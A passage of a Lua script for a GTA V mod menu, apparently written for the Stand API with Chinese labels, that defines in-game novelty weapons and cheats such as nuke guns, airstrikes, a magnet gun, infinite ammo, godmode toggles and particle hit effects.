                    disableProjectileLoop(-1853920116)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)

                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()

                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end

function nukegunmode2(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1312131151 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1312131151)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)

                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()

                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end

function nukegunmode3(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1716589765 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1716589765)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)

                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()

                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end

function nukegunmode4(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == 1593441988 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(1593441988)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)

                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()

                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end

function nukegunmode5(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == 727643628 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(727643628)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)

                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()

                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end

function nukegunmode6(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == 453432689 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(453432689)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)

                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()

                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end

function request_ptfx_load(hash)
    request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(hash)
    while not STREAMING.HAS_PTFX_ASSET_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
function get_waypoint_v3()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
        local waypoint_pos = HUD.GET_BLIP_COORDS(blip)

        local success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
        local tries = 0
        while not success or tries <= 100 do
            success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
            tries += 1
            wait()
        end
        if success then
            waypoint_pos.z = Zcoord
        end

        return waypoint_pos
    else
        util.toast("请在地图上标点，谢谢")
    end
end

object = 0
local format0 = "按 ~%s~ ~%s~ ~%s~ ~%s~ 来使用地毯式骑行"
local format1 = "按 ~%s~ 以移动得更快"
function carpetridexx()
    if state == 0 then
		local objHash = util.joaat("p_cs_beachtowel_01_s")
		request_model(objHash)
		STREAMING.REQUEST_ANIM_DICT("rcmcollect_paperleadinout@")
		while not STREAMING.HAS_ANIM_DICT_LOADED("rcmcollect_paperleadinout@") do
			wait()
		end
		local localPed = players.user_ped()
		local pos = ENTITY.GET_ENTITY_COORDS(localPed, false)
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(localPed)
		object = entities.create_object(objHash, pos)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(
			localPed, object, 0, 0, -0.2, 1.0, 1.0, 1.0,1, false, true, false, false, 0, true, false
		)
		ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(object, false, false)

		TASK.TASK_PLAY_ANIM(localPed, "rcmcollect_paperleadinout@", "meditiate_idle", 8.0, -8.0, -1, 1, 0.0, false, false, false)
        notification(format0 .. ".\n" .. format1 .. '.', HudColour.black,
        "INPUT_MOVE_UP_ONLY", "INPUT_MOVE_DOWN_ONLY", "INPUT_VEH_JUMP", "INPUT_DUCK", "INPUT_VEH_MOVE_UP_ONLY")
		state = 1

	elseif state == 1 then
		HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
		local objPos = ENTITY.GET_ENTITY_COORDS(object, false)
		local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
		ENTITY.SET_ENTITY_ROTATION(object, 0, 0, camrot.z, 0, true)
		local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
		forwardV.z = 0.0
		local delta = v3.new(0, 0, 0)
		local speed = 0.2
		if PAD.IS_CONTROL_PRESSED(0, 61) then
			speed = 1.5
		end
		if PAD.IS_CONTROL_PRESSED(0, 32) then
			delta = v3.new(forwardV)
			delta:mul(speed)
		end
		if PAD.IS_CONTROL_PRESSED(0, 130)  then
			delta = v3.new(forwardV)
			delta:mul(-speed)
		end
		if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then
			delta.z = speed
		end
		if PAD.IS_CONTROL_PRESSED(0, 36) then
			delta.z = -speed
		end
		local newPos = v3.new(objPos)
		newPos:add(delta)
		ENTITY.SET_ENTITY_COORDS(object, newPos.x,newPos.y,newPos.z, false, false, false, false)
	end
end
--定点轰炸
function lhbj()
    local waypointPos = get_waypoint_v3()
    if waypointPos then
        local hash = util.joaat('w_arena_airmissile_01a')
        loadModel(hash)

        waypointPos.z += 30
        local bomb = entities.create_object(hash, waypointPos)
        waypointPos.z -= 30
        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)

        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
            wait()
        end
        entities.delete_by_handle(bomb)
        executeNuke(waypointPos)
    end
end

function executeNuke(pos)
    for a = 0, 100, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10.0, true, false, 1.0, false)
        wait(50)
    end
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z , 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
end
function Streament(hash) --Streaming Model
    STREAMING.REQUEST_MODEL(hash)
    while STREAMING.HAS_MODEL_LOADED(hash) ==false do
    wait()
    end
end

function chibangnie(on_toggle)
if on_toggle then	
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
	local wings = OBJECT.CREATE_OBJECT(util.joaat("vw_prop_art_wings_01a"), pos.x, pos.y, pos.z, true, true, true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("vw_prop_art_wings_01a"))
	ENTITY.ATTACH_ENTITY_TO_ENTITY(wings, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x5c01), -1.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, true, false, true, 0, true)
else
	local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				wait()
			end
			end

end

function kxq()
    local hash <const> = util.joaat("weapon_airstrike_rocket")
	WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
	local raycastResult = get_raycast_result(1000.0)
	if raycastResult.didHit and PED.IS_PED_SHOOTING(players.user_ped()) then
		local pos = raycastResult.endCoords
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			pos.x, pos.y, pos.z + 35.0,
			pos.x, pos.y, pos.z,
			200,
			true,
			hash,
			players.user_ped(), true, false, 2500.0
		)
	end
end

function nukepoint()
    local waypointPos = get_waypoint_v3()
    if waypointPos then
        local hash = util.joaat('w_arena_airmissile_01a')
        loadModel(hash)

        waypointPos.z += 30
        local bomb = entities.create_object(hash, waypointPos)
        waypointPos.z -= 30
        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)

        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
            wait()
        end
        entities.delete_by_handle(bomb)
        executeNuke(waypointPos)
    end
end

nuke_height = 40
function nukeheight(value)
    nuke_height = value
end

local disable_firing = false
local function disableFiringLoop()
    util.create_tick_handler(function()
        PLAYER.DISABLE_PLAYER_FIRING(players.user_ped(), true)
        return disable_firing
    end)
end

local exp_animal = 'a_c_killerwhale'
local explosive_animal_gun
function expaniamlgun(toggle)
    explosive_animal_gun = toggle
    while explosive_animal_gun do
        local weaponHash = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
        local weaponType = WEAPON.GET_WEAPON_DAMAGE_TYPE(weaponHash)
        if weaponType == 3 or (weaponType == 5 and WEAPON.GET_WEAPONTYPE_GROUP(weaponHash) != 1548507267) then --weapons that shoot bullets or explosions and isn't in the throwables category (grenades, proximity mines etc...)
            disable_firing = true
            disableFiringLoop()
            if K.is_disabled_control_pressed(2, 'INPUT_ATTACK') and PLAYER.IS_PLAYER_FREE_AIMING(players.user_ped()) then
                util.create_thread(function()
                    local hash = util.joaat(exp_animal)
                    loadModel(hash)

                    local dir, c1 = direction()
                    local animal = entities.create_ped(28, hash, c1, 0)
                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)

                    ENTITY.APPLY_FORCE_TO_ENTITY(animal, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(animal, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(animal) do
                        wait()
                    end
                    local animalPos = ENTITY.GET_ENTITY_COORDS(animal, true)
                    entities.delete_by_handle(animal)
                    FIRE.ADD_EXPLOSION(animalPos.x, animalPos.y,animalPos.z, 1, 10, true, false, 1, false)
                end)
            end
        else
            disable_firing = false
        end
        wait(200)
    end
    disable_firing = false
end

local impactCords = v3.new()
local blocks = {}
function xxxminecraftgun()
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), impactCords) then
        local hash = util.joaat('prop_mb_sandblock_01')
        loadModel(hash)
        blocks[#blocks + 1] = entities.create_object(hash, impactCords)
    end
end

function deleminecraftlastblock()
    if blocks[#blocks] != nil then
        entities.delete_by_handle(blocks[#blocks])
        blocks[#blocks] = nil
    end
end

function deleallblock()
    for i = 1, #blocks do
        entities.delete_by_handle(blocks[i])
        blocks[i] = nil
    end
end

local flameThrower = {
    colour = mildOrangeFire
}

function flamegun()
    if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) != 1119849093 or not K.is_control_pressed(2, 'INPUT_AIM') then
        if not flameThrower.ptfx then return end

        GRAPHICS.REMOVE_PARTICLE_FX(flameThrower.ptfx, true)
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        flameThrower.ptfx = nil
        return
    end

    PLAYER.DISABLE_PLAYER_FIRING(players.user_ped(), true)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
        STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        wait()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
    if flameThrower.ptfx == nil then
        flameThrower.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped()), 0.8, 0, 0, 0, 0, 270, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped()), 'Gun_Nuzzle'), 0.5, false, false, false)
        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(flameThrower.ptfx, flameThrower.colour.r, flameThrower.colour.g, flameThrower.colour.b)
    end
end

function get_offset_from_cam(dist)
	local rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
	local pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
	local dir = rot:toDir()
	dir:mul(dist)
	local offset = v3.new(pos)
	offset:add(dir)
	return offset
end

function get_vehicles_in_player_range(player, radius)
	local vehicles = {}
	local pos = players.get_position(player)
	for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
		local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
		if pos:distance(vehPos) <= radius then table.insert(vehicles, vehicle) end
	end
	return vehicles
end

local ShootEffect =
{
    scale = 0,
	rotation = nil
}
ShootEffect.__index = ShootEffect
setmetatable(ShootEffect, Effect)

function ShootEffect.new(asset, name, scale, rotation)
	tbl = setmetatable({}, ShootEffect)
	tbl.name = name
	tbl.asset = asset
	tbl.scale = scale or 1.0
	tbl.rotation = rotation or v3.new()
	return tbl
end

---@type ShootEffect[]
local shootingEffects <const> = {
	ShootEffect.new("scr_rcbarry2", "muz_clown", 0.8, v3.new(90, 0.0, 0.0)),
	ShootEffect.new("scr_rcbarry2", "scr_clown_bul", 0.3, v3.new(180.0, 0.0, 0.0))
}

function shootingeffect()
    local effect = shootingEffects[selectedOpt]
	if not WIRI.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
		WIRI.REQUEST_NAMED_PTFX_ASSET(effect.asset)

	elseif PED.IS_PED_SHOOTING(players.user_ped()) then
		local weapon = WIRI.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), false)
		local boneId = WIRI.GET_ENTITY_BONE_INDEX_BY_NAME(weapon, "gun_muzzle")
		WIRI.USE_PARTICLE_FX_ASSET(effect.asset)
		WIRI.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
			effect.name,
			weapon,
			0.0, 0.0, 0.0,
			effect.rotation.x, effect.rotation.y, effect.rotation.z,
			boneId,
			effect.scale,
			false, false, false
		)
	end
end

function setshootingeffect(index)
    selectedOpt = index
end

local colour <const> = {r = 0, g = 255, b = 255, a = 255}

local function draw_marker(type, pos, scale, colour, textureDict, textureName)
	textureDict = textureDict or 0
	textureName = textureName or 0
	GRAPHICS.DRAW_MARKER(
		type,
		pos.x, pos.y, pos.z,
		0.0, 0.0, 0.0,
		0.0, 0.0, 0.0,
		scale, scale, scale,
		colour.r, colour.g, colour.b, colour.a,
		false, false, 0, true, textureDict, textureName, false
	)
end

local function rainbow_colour(colour)
	if colour.r > 0 and colour.b == 0 then
		colour.r = colour.r - 1
		colour.g = colour.g + 1
	end

	if colour.g > 0 and colour.r == 0 then
		colour.g = colour.g - 1
		colour.b = colour.b + 1
	end

	if colour.b > 0 and colour.g == 0 then
		colour.r = colour.r + 1
		colour.b = colour.b - 1
	end
end

entityPairs = {}
shotEntities = {}
counter = 0
function ctst()
    local entity = get_entity_player_is_aiming_at(players.user())
	if entity ~= 0 and ENTITY.DOES_ENTITY_EXIST(entity) then
		draw_bounding_box(entity, true, {r = 255, g = 255, b = 255, a = 81})

		if PED.IS_PED_SHOOTING(players.user_ped()) and
		not (shotEntities[1] and shotEntities[1] == entity) then
			counter = counter + 1
			shotEntities[counter] = entity
		end

		if counter == 2 then
			local entPair = EntityPair.new(table.unpack(shotEntities))
			table.insert_once(entityPairs, entPair)
			counter = 0
			shotEntities = {}
		end
	end

	for i = #entityPairs, 1, -1 do
		local entPair = entityPairs[i]
		if entPair:exists() then entPair:attract() else table.remove(entityPairs, i) end
	end
end

EntityPair = {ent1 = 0, ent2 = 0}
EntityPair.__index = EntityPair

---@param ent1 Entity
---@param ent2 Entity
---@return EntityPair
function EntityPair.new(ent1, ent2)
	local instance = setmetatable({}, EntityPair)
	instance.ent1 = ent1
	instance.ent2 = ent2
	return instance
end

EntityPair.__eq = function (a, b)
	return a.ent1 == b.ent1 and a.ent2 == b.ent2
end

---@return boolean
function EntityPair:exists()
	return ENTITY.DOES_ENTITY_EXIST(self.ent1) and ENTITY.DOES_ENTITY_EXIST(self.ent2)
end

local apply_force_to_ent = function (ent, force, flag)
	if ENTITY.IS_ENTITY_A_PED(ent) then
		if PED.IS_PED_A_PLAYER(ent) then return end
		PED.SET_PED_TO_RAGDOLL(ent, 1000, 1000, 0, false, false, false)
	end
	if request_control_once(ent) then
		ENTITY.APPLY_FORCE_TO_ENTITY(ent, flag or 1, force.x, force.y, force.z, 0.0, 0.0, 0.0, 0, false, false, true, false, false)
	end
end

function EntityPair:attract()
	local pos1 = ENTITY.GET_ENTITY_COORDS(self.ent1, false)
	local pos2 = ENTITY.GET_ENTITY_COORDS(self.ent2, false)
	local force = v3.new(pos2)
	force:sub(pos1)
	force:mul(0.05)
	apply_force_to_ent(self.ent1, force)
	force:mul(-1)
	apply_force_to_ent(self.ent2, force)
end

function magnetgun()
    if not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then return end
	local numVehicles = 0
	local offset = get_offset_from_cam(30.0)
	local vehicles <const> = get_vehicles_in_player_range(players.user(), 70.0)
    rainbow_colour(colour)
    draw_marker(28, offset, 0.4, colour)

	for _, vehicle in ipairs(vehicles) do
		if PED.GET_VEHICLE_PED_IS_USING(players.user_ped()) ~= vehicle and
		numVehicles < 20 and request_control_once(vehicle) then
			numVehicles = numVehicles + 1
			local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
			local vect = v3.new(offset)
			vect:sub(vehiclePos)
			if selectedOpt == 1 then
				ENTITY.SET_ENTITY_VELOCITY(vehicle, vect.x,vect.y,vect.z)

			elseif selectedOpt == 2 then
				vect:mul(0.5)
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, vect.x,vect.y,vect.z, 0.0, 0.0, 0.5, 0, false, false, true, false, false)
			end
		end
	end
end

function setmagnetgun(index)
    selectedOpt = index
end

local thermal_command = menu.ref_by_path('Game>Rendering>Thermal Vision')
function thermalgun()
    local aiming = PLAYER.IS_PLAYER_FREE_AIMING(players.user())
    if GRAPHICS.GET_USINGSEETHROUGH() and not aiming then
        menu.trigger_command(thermal_command,'off')
        GRAPHICS._SEETHROUGH_SET_MAX_THICKNESS(1)
    elseif PAD.IS_CONTROL_JUST_PRESSED(38,38) then
        if menu.get_value(thermal_command) or not aiming then
            menu.trigger_command(thermal_command,"off")
            GRAPHICS._SEETHROUGH_SET_MAX_THICKNESS(1)
        else
            menu.trigger_command(thermal_command,"on")
            GRAPHICS._SEETHROUGH_SET_MAX_THICKNESS(50)
        end
    end
end

function supeerrunning()
    local is_performing_action = PED.IS_PED_PERFORMING_MELEE_ACTION(PLAYER.PLAYER_PED_ID())
	if is_performing_action then
        menu.trigger_commands("godmode on")
        menu.trigger_commands("grace on")
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
		FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 29, 25.0, false, true, 0.0, true)
		AUDIO.PLAY_SOUND_FRONTEND(-1, "EMP_Blast", "DLC_HEISTS_BIOLAB_FINALE_SOUNDS", false)
    else
        menu.trigger_commands("godmode off")
	end
end

function runreload()
    if TASK.GET_IS_TASK_ACTIVE(PLAYER.PLAYER_PED_ID(), 4) and PAD.IS_CONTROL_PRESSED(2, 22) and not PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        --checking if player is rolling
        wait(900)
        WEAPON.REFILL_AMMO_INSTANTLY(PLAYER.PLAYER_PED_ID())
    end
end

function unlimitedbullet(toggle)
    isInfiniteAmmo = toggle

    while isInfiniteAmmo do
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(PLAYER.PLAYER_PED_ID(), true)
        wait()
    end

    if not isInfiniteAmmo then
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(PLAYER.PLAYER_PED_ID(), false)
    end
end

function lockthebullet()
    local curWeaponMem = memory.alloc()
    local junk = WEAPON.GET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), curWeaponMem, 1)
    local curWeapon = memory.read_int(curWeaponMem)
    memory.free(curWeaponMem)

    local curAmmoMem = memory.alloc()
    junk = WEAPON.GET_MAX_AMMO(PLAYER.PLAYER_PED_ID(), curWeapon, curAmmoMem)
    local curAmmoMax = memory.read_int(curAmmoMem)
    memory.free(curAmmoMem)

    if curAmmoMax then
        WEAPON.SET_PED_AMMO(PLAYER.PLAYER_PED_ID(), curWeapon, curAmmoMax)
    end
end

function airstgun()
    local hash <const> = util.joaat("weapon_airstrike_rocket")
	WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
	local raycastResult = get_raycast_result(1000.0)
	if raycastResult.didHit and PED.IS_PED_SHOOTING(players.user_ped()) then
		local pos = raycastResult.endCoords
		WIRI_MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			pos.x, pos.y, pos.z + 35.0,
			pos.x, pos.y, pos.z,
			200,
			true,
			hash,
			players.user_ped(), true, false, 2500.0)
	end
end

local function get_time_between_shots()
	local CPed = entities.handle_to_pointer(players.user_ped())
	local addr = addr_from_pointer_chain(CPed, {0x10B8, 0x20, 0x013C})
	return addr ~= 0 and memory.read_float(addr) * 1000 or -1.0
end

function bulletchanger()
    local localPed = players.user_ped()
	if not WEAPON.IS_PED_ARMED(localPed, 4) then
		return
	end

	local selectedBullet = util.joaat(weaponbulletModels[selectedOpt])
	if not WEAPON.HAS_WEAPON_ASSET_LOADED(selectedBullet) then
		WEAPON.REQUEST_WEAPON_ASSET(selectedBullet, 31, 26)
		WEAPON.GIVE_WEAPON_TO_PED(localPed, selectedBullet, 200, false, false)
	end

	PLAYER.DISABLE_PLAYER_FIRING(players.user(), true)
	if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) and
	PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and timer.elapsed() > math.max(get_time_between_shots(), 80.0) then
		local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(localPed, false)
		local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(weapon, "gun_muzzle")
		local bonePos = WIRI_ENTITY.GET_ENTITY_BONE_POSTION(weapon, bone)
		local offset = get_offset_from_cam(30.0)

		WIRI_MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			bonePos.x, bonePos.y, bonePos.z,
			offset.x, offset.y, offset.z,
			200,
			true,
			selectedBullet,
			localPed, true, false, 2000.0
		)
		WIRI_PAD.SET_CONTROL_SHAKE(0, 50, 100)
		timer.reset()

	elseif PAD.IS_DISABLED_CONTROL_JUST_RELEASED(0, 24) then
		WIRI_PAD.STOP_CONTROL_SHAKE(0)
	end
end

function bulletchanger_set(opt)
    selectedOpt = opt
end

local HitEffect = {colorCanChange = false}
HitEffect.__index = HitEffect
setmetatable(HitEffect, Effect)

function HitEffect.new(asset, name, colorCanChange)
	local inst = setmetatable({}, HitEffect)
	inst.name = name
	inst.asset = asset
	inst.colorCanChange = colorCanChange or false
	return inst
end

local hitEffects <const> = {
	HitEffect.new("scr_rcbarry2", "scr_exp_clown"),
	HitEffect.new("scr_rcbarry2", "scr_clown_appears"),
	HitEffect.new("scr_rcpaparazzo1", "scr_mich4_firework_trailburst_spawn", true),
	HitEffect.new("scr_indep_fireworks", "scr_indep_firework_starburst", true),
	HitEffect.new("scr_indep_fireworks", "scr_indep_firework_fountain", true),
	HitEffect.new("scr_rcbarry1", "scr_alien_disintegrate"),
	HitEffect.new("scr_rcbarry2", "scr_clown_bul"),
	HitEffect.new("proj_indep_firework", "scr_indep_firework_grd_burst"),
	HitEffect.new("scr_rcbarry2", "muz_clown"),
    HitEffect.new("scr_sum2_hal", "scr_sum2_hal_rider_death_green"),
    HitEffect.new("scr_sum2_hal", "scr_sum2_hal_rider_weak_green"),
    HitEffect.new("scr_agencyheistb", "scr_agency3b_heli_exp_trail"),
    HitEffect.new("scr_agencyheistb", "scr_agency3b_elec_box"),
    HitEffect.new("scr_rcpaparazzo1", "scr_mich4_firework_burst_spawn"),
    HitEffect.new("core", "ent_dst_elec_fire_sp")
}
hiteffectchinese = {
	{"猛女子弹"},
	{"小丑出现"},
	{"开拓者FW"},
	{"星爆FW"},
	{"喷泉FW"},
	{"外星解体"},
	{"小丑花"},
	{"地面冲击波FW"},
	{"小丑木兹"},
    {"毒气"},
    {"旋风子弹"},
    {"战火子弹"},
    {"烟雾子弹"},
    {"星星子弹"},
    {"电光子弹"}
}

